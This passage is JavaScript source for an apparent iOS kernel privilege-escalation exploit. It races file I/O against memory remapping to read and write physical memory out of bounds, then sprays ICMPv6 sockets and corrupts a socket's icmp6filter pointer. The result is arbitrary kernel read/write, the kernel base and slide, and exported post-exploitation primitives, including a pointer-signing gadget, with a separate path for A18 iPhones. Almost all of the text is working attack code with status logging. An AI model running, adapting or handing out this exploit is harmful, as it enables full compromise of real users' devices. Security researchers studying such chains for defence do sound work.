32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 76, 79, 71, 40, 34, 91, 45, 93, 32, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 32, 102, 97, 105, 108, 101, 100, 32, 33, 33, 33, 34, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 58, 32, 34, 32, 43, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 46, 104, 101, 120, 40, 41, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 58, 32, 34, 32, 43, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 46, 104, 101, 120, 40, 41, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 101, 120, 105, 116, 40, 48, 110, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 114, 97, 99, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 47, 47, 32, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 125, 10, 10, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 40, 41, 59, 0]);
  let free_thread_js = 0n;
  if (free_thread_js == 0n) {
    free_thread_js = free_thread_js_data;
  }
  free_thread_jsthread = js_thread_spawn(free_thread_js, free_thread_arg);
}
let default_file_content = calloc(1n, target_file_size);
memset_pattern8(default_file_content, get_bigint_addr(random_marker), target_file_size);
function create_target_file(path) {
  let fd = fopen(path, get_cstring("w"));
  let written = fwrite(default_file_content, 1n, target_file_size, fd);
  fclose(fd);
}
function create_physically_contiguous_mapping(port, address, size) {
  let dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0n, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
  let cf_number = CFNumberCreate(kCFAllocatorDefault, 9n, get_bigint_addr(size));
  res = CFDictionarySetValue(dict, kIOSurfaceAllocSize, cf_number);
  let cfstring = create_cfstring(get_cstring("PurpleGfxMem"));
  res = CFDictionarySetValue(dict, create_cfstring(get_cstring("IOSurfaceMemoryRegion")), cfstring);
  let surface = IOSurfaceCreate(dict);
  CFRelease(dict);
  if (surface == 0n) {
    LOG("[-] Failed to create surface!!!");
    exit(0n);
  }
  let physical_mapping_address = IOSurfaceGetBaseAddress(surface);
  LOG("[+] physical_mapping_address: " + physical_mapping_address.hex());
  let memory_object = new_bigint();
  let kr = mach_make_memory_entry_64(mach_task_self(), get_bigint_addr(size), physical_mapping_address, VM_PROT_DEFAULT, get_bigint_addr(memory_object), 0n);
  if (kr != KERN_SUCCESS) {
    LOG("[-] mach_make_memory_entry_64 failed!!!");
    exit(0n);
  }
  let new_mapping_address = new_bigint();
  kr = mach_vm_map(mach_task_self(), get_bigint_addr(new_mapping_address), size, 0n, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, memory_object, 0n, 0n, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
  if (kr != KERN_SUCCESS) {
    LOG("[-] mach_vm_map failed!!!");
    exit(0n);
  }
  CFRelease(surface);
  uwrite64(port, memory_object);
  uwrite64(address, new_mapping_address);
}
function initialize_physical_read_write(contiguous_mapping_size) {
  pc_size = contiguous_mapping_size;
  create_physically_contiguous_mapping(get_bigint_addr(pc_object), get_bigint_addr(pc_address), pc_size);
  LOG("[+] pc_object: " + pc_object.hex());
  LOG("[+] pc_address: " + pc_address.hex());
  memset_pattern8(pc_address, get_bigint_addr(random_marker), pc_size);
  free_target = pc_address;
  free_target_size = pc_size;
  uwrite64(free_target_sync_ptr, free_target);
  uwrite64(free_target_size_sync_ptr, free_target_size);
  uwrite64(free_thread_start_ptr, 1n);
  uwrite64(go_sync_ptr, 1n);
}
let iov = calloc(1n, 0x10n);
let highiest_success_idx = 0n;
let success_read_count = 0n;
function physical_oob_read_mo(mo, mo_offset, size, offset, buffer) {
  uwrite64(target_object_sync_ptr, mo);
  uwrite64(target_object_offset_sync_ptr, mo_offset);
  uwrite64(iov + 0x00n, pc_address + 0x3f00n);
  uwrite64(iov + 0x08n, offset + size);
  uwrite64(buffer, random_marker);
  uwrite64(pc_address + 0x3f00n + offset, random_marker);
  let read_race_succeeded = false;
  let w = 0n;
  for (let try_idx = 0n; try_idx < highiest_success_idx + 100n; try_idx++) {
    uwrite64(race_sync_ptr, 1n);
    w = pwritev(read_fd, iov, 1n, 0x3f00n);
    cmp8_wait_for_change(race_sync_ptr, 1);
    kr = mach_vm_map(mach_task_self(), get_bigint_addr(pc_address), pc_size, 0n, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pc_object, 0n, 0n, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
      LOG("[-] mach_vm_map failed!!!");
      exit(0n);
    }
    if (w == 0xFFFFFFFFFFFFFFFFn) {
      let r = pread(read_fd, buffer, size, 0x3f00n + offset);
      let marker = uread64(buffer);
      if (marker != random_marker) {
        read_race_succeeded = true;
        success_read_count += 0x1n;
        if (try_idx > highiest_success_idx) {
          highiest_success_idx = try_idx;
        }
        break;
      } else {
        usleep(1n);
      }
    }
    if (try_idx == 500n) {
      break;
    }
  }
  uwrite64(target_object_sync_ptr, 0n);
  if (read_race_succeeded == false) {
    return 1n;
  }
  return KERN_SUCCESS;
}
function physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer) {
  while (true) {
    kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
    if (kr == KERN_SUCCESS) {
      break;
    }
  }
}
function physical_oob_write_mo(mo, mo_offset, size, offset, buffer) {
  uwrite64(target_object_sync_ptr, mo);
  uwrite64(target_object_offset_sync_ptr, mo_offset);
  uwrite64(iov + 0x00n, pc_address + 0x3f00n);
  uwrite64(iov + 0x08n, offset + size);
  pwrite(write_fd, buffer, size, 0x3f00n + offset);
  for (let try_idx = 0n; try_idx < 20n; try_idx++) {
    uwrite64(race_sync_ptr, 1n);
    preadv(write_fd, iov, 1n, 0x3f00n);
    cmp8_wait_for_change(race_sync_ptr, 1);
    kr = mach_vm_map(mach_task_self(), get_bigint_addr(pc_address), pc_size, 0n, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pc_object, 0n, 0n, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
      LOG("[-] mach_vm_map failed!!!");
      exit(0n);
    }
  }
  uwrite64(target_object_sync_ptr, 0n);
  return;
}
let control_socket = 0n;
let rw_socket = 0n;
let control_socket_pcb = 0n;
let rw_socket_pcb = 0n;
let EARLY_KRW_LENGTH = 0x20n;
let control_data = calloc(1n, EARLY_KRW_LENGTH);
function set_target_kaddr(where) {
  memset(control_data, 0n, EARLY_KRW_LENGTH);
  uwrite64(control_data, where);
  let res = setsockopt(control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, control_data, EARLY_KRW_LENGTH);
  if (res != 0n) {
    LOG("[-] setsockopt failed!!!");
    exit(0n);
  }
}
function early_kread(where, read_buf, size) {
  if (size > EARLY_KRW_LENGTH) {
    LOG("[!] error: (size > EARLY_KRW_LENGTH)");
    exit(0n);
  }
  set_target_kaddr(where);
  let read_data_length = BigInt(size);
  res = getsockopt(rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf, get_bigint_addr(read_data_length));
  if (res != 0n) {
    LOG("[-] getsockopt failed!!!");
    exit(0n);
  }
}
function early_kread64(where) {
  let value = new_bigint();
  let res = early_kread(where, get_bigint_addr(value), 0x8n);
  return update_bigint(value);
}
function early_kwrite32bytes(where, write_buf) {
  set_target_kaddr(where);
  let res = setsockopt(rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, write_buf, EARLY_KRW_LENGTH);
  if (res != 0n) {
    LOG("[-] setsockopt failed!!!");
    exit(0n);
  }
}
let early_kwrite64_write_buf = calloc(1n, EARLY_KRW_LENGTH);
function early_kwrite64(where, what) {
  early_kread(where, early_kwrite64_write_buf, EARLY_KRW_LENGTH);
  uwrite64(early_kwrite64_write_buf, what);
  early_kwrite32bytes(where, early_kwrite64_write_buf);
}
function kread_length(address, buffer, size) {
  let remaining = BigInt(size);
  let read_offset = 0n;
  let read_size = 0n;
  while (remaining != 0n) {
    if (remaining >= EARLY_KRW_LENGTH) {
      read_size = EARLY_KRW_LENGTH;
    } else {
      read_size = remaining % EARLY_KRW_LENGTH;
    }
    early_kread(address + read_offset, buffer + read_offset, read_size);
    remaining -= read_size;
    read_offset += read_size;
  }
}
let kwrite_length_buffer = calloc(1n, EARLY_KRW_LENGTH);
function kwrite_length(dst, src, size) {
  let remaining = BigInt(size);
  let write_offset = 0n;
  let write_size = 0n;
  while (remaining != 0n) {
    if (remaining >= EARLY_KRW_LENGTH) {
      write_size = EARLY_KRW_LENGTH;
    } else {
      write_size = remaining % EARLY_KRW_LENGTH;
    }
    let kwrite_dst_addr = dst + write_offset;
    let kwrite_src_addr = src + write_offset;
    if (write_size != EARLY_KRW_LENGTH) {
      kread_length(kwrite_dst_addr, kwrite_length_buffer, EARLY_KRW_LENGTH);
    }
    memcpy(kwrite_length_buffer, kwrite_src_addr, write_size);
    early_kwrite32bytes(kwrite_dst_addr, kwrite_length_buffer);
    remaining -= write_size;
    write_offset += write_size;
  }
}
function kwrite_zone_element(dst, src, len) {
  let CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE = 0x20n;
  if (len < CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {
    LOG("kwrite_zone_element supports only zone element size >= 0x20");
    return false;
  }
  let write_size = 0n;
  let write_offset = 0n;
  let remaining = BigInt(len);
  while (remaining != 0n) {
    write_size = remaining >= CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE ? CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE : remaining % CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE;
    let kwrite_dst_addr = dst + write_offset;
    let kwrite_src_addr = src + write_offset;
    if (write_size != CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {
      let adjust = CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE - write_size;
      kwrite_dst_addr -= adjust;
      kwrite_src_addr -= adjust;
    }
    kwrite_length(kwrite_dst_addr, kwrite_src_addr, CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE);
    remaining -= write_size;
    write_offset += write_size;
  }
  return true;
}
function kdump(where, size, msg = "") {
  LOG(`[+] ----------- ${msg} ----------`);
  for (let i = 0n; i < size; i += 0x10n) {
    LOG(`[+] [${i.hex()}] ${(where + i).hex()}:\t${early_kread64(where + i).hex()} ${early_kread64(where + i + 8n).hex()}`);
  }
}
function krw_sockets_leak_forever() {
  let offset_pcb_socket = 0x40n;
  let offset_socket_so_count = 0x254n;
  let control_socket_addr = early_kread64(control_socket_pcb + offset_pcb_socket);
  let rw_socket_addr = early_kread64(rw_socket_pcb + offset_pcb_socket);
  if (control_socket_addr == 0n || rw_socket_addr == 0n) {
    LOG("[-] Couldn't find control_socket_addr || rw_socket_addr");
    exit(0n);
  }
  let control_socket_so_count = early_kread64(control_socket_addr + offset_socket_so_count);
  let rw_socket_so_count = early_kread64(rw_socket_addr + offset_socket_so_count);
  early_kwrite64(control_socket_addr + offset_socket_so_count, control_socket_so_count + 0x0000100100001001n);
  early_kwrite64(rw_socket_addr + offset_socket_so_count, rw_socket_so_count + 0x0000100100001001n);
  let icmp6filt_offset = 0x148n;
  early_kwrite64(rw_socket_pcb + icmp6filt_offset + 0x8n, 0n);
}
let socket_ports = [];
let socket_pcb_ids = [];
let socket_ports_count = 0n;
let getsockopt_read_length = 32n;
let getsockopt_read_data = calloc(1n, getsockopt_read_length);
let socket_info = calloc(1n, 0x400n);
function spray_socket(socket_ports, socket_pcb_ids) {
  let fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
  if (fd == 0xFFFFFFFFFFFFFFFFn) {
    LOG("[-] socket create failed!!!");
    return fd;
  }
  let output_socket_port = new_bigint();
  fileport_makeport(fd, get_bigint_addr(output_socket_port));
  close(fd);
  let r = syscall(336n, 6n, getpid(), 3n, output_socket_port, socket_info, 0x400n);
  let inp_gencnt = uread64(socket_info + 0x110n);
  socket_ports.push(output_socket_port);
  socket_pcb_ids.push(inp_gencnt);
  return output_socket_port;
}
function sockets_release() {
  for (let sock_idx = 0n; sock_idx < socket_ports_count; sock_idx++) {
    let port = socket_ports.pop();
    mach_port_deallocate(mach_task_self(), port);
    socket_pcb_ids.pop();
  }
  socket_ports_count = 0n;
}
function create_surface_with_address(address, size) {
  let properties = CFDictionaryCreateMutable(kCFAllocatorDefault, 0n, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
  let address_ptr = new_uint64_t(address);
  let address_number = CFNumberCreate(kCFAllocatorDefault, 11n, address_ptr);
  CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAddress")), address_number);
  let size_ptr = new_uint64_t(size);
  let size_number = CFNumberCreate(kCFAllocatorDefault, 9n, size_ptr);
  CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAllocSize")), size_number);
  let surface = IOSurfaceCreate(properties);
  IOSurfacePrefetchPages(surface);
  free(address_ptr);
  free(size_ptr);
  CFRelease(address_number);
  CFRelease(size_number);
  CFRelease(properties);
  return surface;
}
let mlock_dict = {};
function surface_mlock(address, size) {
  let surf = create_surface_with_address(address, size);
  mlock_dict[address] = surf;
}
function surface_munlock(address, size) {
  if (mlock_dict[address] != undefined) {
    CFRelease(mlock_dict[address]);
  }
  mlock_dict[address] = undefined;
}
function find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, do_read = true) {
  if (do_read == true) {
    physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
  }
  let search_start_idx = 0n;
  let target_found = false;
  let pcb_start_offset = 0n;
  let icmp6filt_offset = 0x148n;
  let found = 0n;
  do {
    found = memmem(read_buffer + search_start_idx, oob_size - search_start_idx, executable_name, strlen(executable_name));
    if (found != 0n) {
      pcb_start_offset = found - read_buffer & 0xFFFFFFFFFFFFFC00n;
      if (uread64(read_buffer + pcb_start_offset + icmp6filt_offset + 0x8n) == 0x0000ffffffffffffn) {
        target_found = true;
        break;
      }
    }
    search_start_idx += 0x400n;
  } while (found != 0n && search_start_idx < oob_size);
  if (target_found == true) {
    LOG("[+] pcb_start_offset: " + pcb_start_offset.hex());
    let target_inp_gencnt = uread64(read_buffer + pcb_start_offset + 0x78n);
    LOG("[+] target_inp_gencnt: " + target_inp_gencnt.hex());
    if (target_inp_gencnt == socket_pcb_ids[socket_ports_count - 1n]) {
      LOG(`[-] Found last PCB`);
      return -1n;
    }
    let is_our_pcb = false;
    let control_socket_idx = undefined;
    for (let sock_idx = 0n; sock_idx < socket_ports_count; sock_idx++) {
      if (socket_pcb_ids[sock_idx] == target_inp_gencnt) {
        is_our_pcb = true;
        control_socket_idx = sock_idx;
        break;
      }
    }
    if (is_our_pcb == false) {
      LOG(`[-] Found freed PCB Page!`);
      return -1n;
    }
    if (target_inp_gencnt_list.includes(target_inp_gencnt)) {
      LOG(`[-] Found old PCB Page!!!!`);
      return -1n;
    } else {
      target_inp_gencnt_list.push(target_inp_gencnt);
    }
    let inp_list_next_pointer = uread64(read_buffer + pcb_start_offset + 0x28n) - 0x20n;
    let icmp6filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
    LOG("[+] inp_list_next_pointer: " + inp_list_next_pointer.hex());
    LOG("[+] icmp6filter: " + icmp6filter.hex());
    rw_socket_pcb = BigInt(inp_list_next_pointer);
    memcpy(write_buffer, read_buffer, oob_size);
    uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset, inp_list_next_pointer + icmp6filt_offset);
    uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset + 0x8n, 0n);
    LOG("[+] Corrupting icmp6filter pointer...");
    while (true) {
      physical_oob_write_mo(memory_object, seeking_offset, oob_size, oob_offset, write_buffer);
      physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
      let new_icmp6filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
      if (new_icmp6filter == inp_list_next_pointer + icmp6filt_offset) {
        LOG("[+] target corrupted: " + uread64(read_buffer + pcb_start_offset + icmp6filt_offset).hex());
        break;
      }
    }
    let sock = fileport_makefd(socket_ports[control_socket_idx]);
    let res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockopt_read_data, get_bigint_addr(getsockopt_read_length));
    if (res != 0n) {
      LOG("[-] getsockopt failed!!!");
      exit(0n);
    }
    let marker = uread64(getsockopt_read_data);
    if (marker != 0xffffffffffffffffn) {
      LOG("[+] Found control_socket at idx: " + control_socket_idx.hex());
      control_socket = sock;
      rw_socket = fileport_makefd(socket_ports[control_socket_idx + 0x1n]);
      return KERN_SUCCESS;
    } else {
      LOG("[-] Failed to corrupt control_socket at idx: " + control_socket_idx.hex());
    }
  }
  return -1n;
}
let kernel_base = 0n;
let kernel_slide = 0n;
let is_a18_devices = false;
function pe_v1() {
  let n_of_total_search_mapping_pages = 0x1000n * 0x10n;
  if (is_a18_devices) {
    n_of_total_search_mapping_pages = 0x10n * 0x10n;
  }
  let search_mapping_size = 0x2000n * PAGE_SIZE;
  if (is_a18_devices) {
    search_mapping_size = 0x10n * PAGE_SIZE;
  }
  let total_search_mapping_size = n_of_total_search_mapping_pages * PAGE_SIZE;
  let n_of_search_mappings = total_search_mapping_size / search_mapping_size;
  let read_buffer = calloc(1n, oob_size);
  let write_buffer = calloc(1n, oob_size);
  initialize_physical_read_write(n_of_oob_pages * PAGE_SIZE);
  let wired_mapping = new_bigint();
  let wired_mapping_size = 1024n * 1024n * 1024n * 3n;
  if (is_a18_devices) {
    kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(wired_mapping), wired_mapping_size, VM_FLAGS_ANYWHERE);
    LOG(`[+] wired_mapping: ${wired_mapping.hex()}`);
  }
  let target_inp_gencnt_list = [];
  while (true) {
    if (is_a18_devices) {
      surface_mlock(wired_mapping, wired_mapping_size);
      for (let s = 0n; s < wired_mapping_size / 0x4000n; s++) {
        uwrite64(wired_mapping + s * 0x4000n, 0n);
      }
    }
    let search_mappings = [];
    for (let s = 0n; s < n_of_search_mappings; s++) {
      let search_mapping_address = new_bigint();
      kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(search_mapping_address), search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_vm_allocate failed!!!");
        exit(0n);
      }
      for (let k = 0n; k < search_mapping_size; k += PAGE_SIZE) {
        uwrite64(search_mapping_address + k, random_marker);
      }
      search_mappings.push(search_mapping_address);
    }
    socket_ports = [];
    socket_pcb_ids = [];
    socket_ports_count = 0n;
    const OPEN_MAX = 10240n;
    let maxfiles = 3n * OPEN_MAX;
    let leeway = 4096n * 2n;
    for (let socket_count = 0n; socket_count < maxfiles - leeway; socket_count++) {
      let port = spray_socket(socket_ports, socket_pcb_ids);
      if (port == 0xFFFFFFFFFFFFFFFFn) {
        LOG("[-] Failed to spray sockets: " + socket_ports_count.hex());
        break;
      } else {
        socket_ports_count++;
      }
    }
    let start_pcb_id = socket_pcb_ids[0];
    let end_pcb_id = socket_pcb_ids[socket_ports_count - 1n];
    LOG(`[i] socket_ports_count: ${socket_ports_count.hex()}`);
    LOG(`[i] start_pcb_id: ${start_pcb_id.hex()}`);
    LOG(`[i] end_pcb_id: ${end_pcb_id.hex()}`);
    let success = false;
    for (let s = 0n; s < n_of_search_mappings; s++) {
      let search_mapping_address = search_mappings[s];
      LOG("[i] looking in search mapping: " + s);
      let memory_object = new_bigint();
      let memory_object_size = BigInt(search_mapping_size);
      kr = mach_make_memory_entry_64(mach_task_self(), get_bigint_addr(memory_object_size), search_mapping_address, VM_PROT_DEFAULT, get_bigint_addr(memory_object), 0n);
      if (kr != 0n) {
        LOG("[-] mach_make_memory_entry_64 failed!!!");
        exit(0n);
      }
      surface_mlock(search_mapping_address, search_mapping_size);
      let seeking_offset = 0n;
      while (seeking_offset < search_mapping_size) {
        kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
        if (kr == KERN_SUCCESS) {
          if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, false) == KERN_SUCCESS) {
            success = true;
            break;
          }
        }
        seeking_offset += PAGE_SIZE;
      }
      kr = mach_port_deallocate(mach_task_self(), memory_object);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_port_deallocate failed!!!");
        exit(0n);
      }
      if (success == true) {
        break;
      }
    }
    sockets_release();
    for (let s = 0n; s < n_of_search_mappings; s++) {
      let search_mapping_address = search_mappings.pop();
      kr = mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
    }
    if (is_a18_devices) {
      surface_munlock(wired_mapping, wired_mapping_size);
    }
    if (success == true) {
      break;
    }
  }
}
function pe_v2() {
  let read_buffer = calloc(1n, oob_size);
  let write_buffer = calloc(1n, oob_size);
  initialize_physical_read_write(n_of_oob_pages * PAGE_SIZE);
  let getsockopt_read_length = 32n;
  let getsockopt_read_data = calloc(1n, getsockopt_read_length);
  let wired_mapping_entry_size = PAGE_SIZE;
  let wired_mapping_entries_total_size = 1024n * 1024n * 1024n * 2n;
  let n_of_wired_mapping_entries = wired_mapping_entries_total_size / wired_mapping_entry_size;
  let wired_mapping_entries_addresses = [];
  LOG("[i] Allocating memory");
  let kr = KERN_SUCCESS;
  let wired_address = 0n;
  for (let i = 0n; i < n_of_wired_mapping_entries; i++) {
    if (i == 0n) {
      wired_address = new_bigint();
      do {
        kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(wired_address), wired_mapping_entry_size, VM_FLAGS_ANYWHERE);
      } while (kr != KERN_SUCCESS);
    } else {
      wired_address = BigInt(wired_mapping_entries_addresses.slice(-1));
      do {
        wired_address += wired_mapping_entry_size;
        kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(wired_address), wired_mapping_entry_size, VM_FLAGS_FIXED);
      } while (kr != KERN_SUCCESS);
    }
    wired_mapping_entries_addresses.push(wired_address);
    surface_mlock(wired_address, wired_mapping_entry_size);
    uwrite64(wired_address, wired_page_marker);
    uwrite64(wired_address + 0x8n, wired_address);
  }
  let target_inp_gencnt_list = [];
  LOG("[i] Allocating memory done");
  while (true) {
    let search_mapping_size = 0x800n * PAGE_SIZE;
    let search_mapping_address = new_bigint();
    kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(search_mapping_address), search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
    if (kr != KERN_SUCCESS) {
      LOG("[-] mach_vm_allocate failed!!!");
      exit(0n);
    }
    for (let k = 0n; k < search_mapping_size; k += PAGE_SIZE) {
      uwrite64(search_mapping_address + k, random_marker);
    }
    surface_mlock(search_mapping_address, search_mapping_size);
    let memory_object = new_bigint();
    let memory_object_size = BigInt(search_mapping_size);
    kr = mach_make_memory_entry_64(mach_task_self(), get_bigint_addr(memory_object_size), search_mapping_address, VM_PROT_DEFAULT, get_bigint_addr(memory_object), 0n);
    if (kr != 0n) {
      LOG("[-] mach_make_memory_entry_64 failed!!!");
      exit(0n);
    }
    socket_ports = [];
    socket_pcb_ids = [];
    socket_ports_count = 0n;
    let max_sockets_count = 0x5800n;
    let split_count = 8n;
    let wired_pages = [];
    let success = false;
    let seeking_offset = 0n;
    while (seeking_offset < search_mapping_size) {
      kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
      if (kr != KERN_SUCCESS) {
        seeking_offset += PAGE_SIZE;
        continue;
      }
      if (uread64(read_buffer) == wired_page_marker) {
        let wired_page = uread64(read_buffer + 0x8n);
        LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Found wired_page: ${wired_page.hex()}`);
        if (wired_pages.indexOf(wired_page) == -1) {
          wired_pages.push(wired_page);
          let idx = wired_mapping_entries_addresses.indexOf(wired_page);
          wired_mapping_entries_addresses.splice(idx, 1);
          uwrite64(wired_page, 0n);
          uwrite64(wired_page + 0x8n, 0n);
        } else {
          LOG(`[-] Found old wired page!!!!`);
          seeking_offset += PAGE_SIZE;
          continue;
        }
        kr = mach_vm_deallocate(mach_task_self(), wired_page, wired_mapping_entry_size);
        if (kr != KERN_SUCCESS) {
          LOG(`[-] Failed to deallocate wired page!!!!`);
        }
        for (let socket_count = 0n; socket_count < max_sockets_count / split_count; socket_count++) {
          let port = spray_socket(socket_ports, socket_pcb_ids);
          if (port == 0xFFFFFFFFFFFFFFFFn) {
            LOG("[-] Failed to spray sockets: " + socket_ports_count.hex());
            break;
          } else {
            socket_ports_count++;
          }
        }
        if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, true) == KERN_SUCCESS) {
          LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Reallocated PCB page`);
          success = true;
          break;
        } else {
          if (socket_ports_count >= max_sockets_count) {
            sockets_release();
            LOG("[+] waiting for zone trimming...");
            sleep(20n);
          }
          seeking_offset = 0n;
        }
      } else if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, false) == KERN_SUCCESS) {
        LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Found PCB page`);
        success = true;
        break;
      } else {
        seeking_offset += PAGE_SIZE;
      }
    }
    kr = mach_port_deallocate(mach_task_self(), memory_object);
    if (kr != KERN_SUCCESS) {
      LOG("[-] mach_port_deallocate failed!!!");
      exit(0n);
    }
    sockets_release();
    kr = mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
    if (success == true) {
      break;
    }
  }
  for (let i = 0n; i < BigInt(wired_mapping_entries_addresses.length); i++) {
    let wired_page = wired_mapping_entries_addresses[i];
    mach_vm_deallocate(mach_task_self(), wired_page, wired_mapping_entry_size);
  }
}
function pe() {
  let device_machine = get_device_machine();
  if (strstr(device_machine, get_cstring("iPhone17,")) != 0n) {
    LOG("[+] Running on A18 Devices");
    is_a18_devices = true;
    sleep(8n);
    pe_init();
    pe_v2();
  } else {
    LOG("[+] Running on non-A18 Devices");
    pe_init();
    pe_v1();
  }
  LOG(`[+] highiest_success_idx: ${highiest_success_idx}`);
  LOG(`[+] success_read_count: ${success_read_count}`);
  uwrite64(go_sync_ptr, 0n);
  uwrite64(race_sync_ptr, 1n);
  js_thread_join(free_thread_jsthread);
  close(write_fd);
  close(read_fd);
  control_socket_pcb = early_kread64(rw_socket_pcb + 0x20n);
  let pcbinfo_pointer = early_kread64(control_socket_pcb + 0x38n);
  let ipi_zone = early_kread64(pcbinfo_pointer + 0x68n);
  let zv_name = early_kread64(ipi_zone + 0x10n);
  kernel_base = zv_name & 0xFFFFFFFFFFFFC000n;
  while (true) {
    if (early_kread64(kernel_base) == 0x100000cfeedfacfn) {
      if (early_kread64(kernel_base + 0x8n) == 0xc00000002n) {
        break;
      }
    }
    kernel_base -= PAGE_SIZE;
  }
  kernel_slide = kernel_base - 0xfffffff007004000n;
  krw_sockets_leak_forever();
}
mpd_js_thread_spawn = js_thread_spawn;
mpd_js_thread_join = js_thread_join;
mpd_pe = pe;
mpd_kread64 = early_kread64;
mpd_kwrite64 = early_kwrite64;
mpd_kwrite_length = kwrite_length;
mpd_kread_length = kread_length;
mpd_kwrite_zone_element = kwrite_zone_element;
mpd_control_socket = function() { return control_socket; }
mpd_rw_socket = function() { return rw_socket; }
mpd_pacia_gadget = function() { return dyld_signPointer_gadget; }
mpd_kernel_slide = function (addr = 0n) {
  return addr + kernel_slide;
};
mpd_kernel_base = function () {
  return kernel_base;
};
pe();
 
LOG("[+] PE Post-Exploitation !!!");
LOG(`[+] kernel_base: ${mpd_kernel_base().hex()}`);
LOG(`[+] kernel_slide: ${mpd_kernel_slide().hex()}`);
let main = {};
main.chainData = {
  "chosenOffsets": null
}
